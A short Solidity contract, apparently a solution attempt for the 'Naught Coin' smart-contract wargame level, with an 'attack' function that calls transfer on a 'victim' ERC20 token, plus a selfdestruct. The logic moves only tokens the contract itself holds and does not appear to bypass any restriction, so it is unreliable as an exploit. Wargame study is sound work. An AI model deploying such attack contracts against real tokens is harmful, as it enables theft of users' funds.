// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ERC20 {
    function transfer(address _to, uint256 _value) external returns (bool);

    function balanceOf(address account) external view returns (uint256);
}

contract MyNaughtCoin {
    ERC20 victimContract;
    address payable owner;

    constructor(address _victimaddress) public {
        victimContract = ERC20(_victimaddress);
        owner = msg.sender;
    }

    function attack(uint256 _balance) public {
        victimContract.transfer(msg.sender, _balance);
    }

    function getBalance() public view returns (uint256) {
        return victimContract.balanceOf(msg.sender);
    }

    function kill() public {
        selfdestruct(owner);
    }
}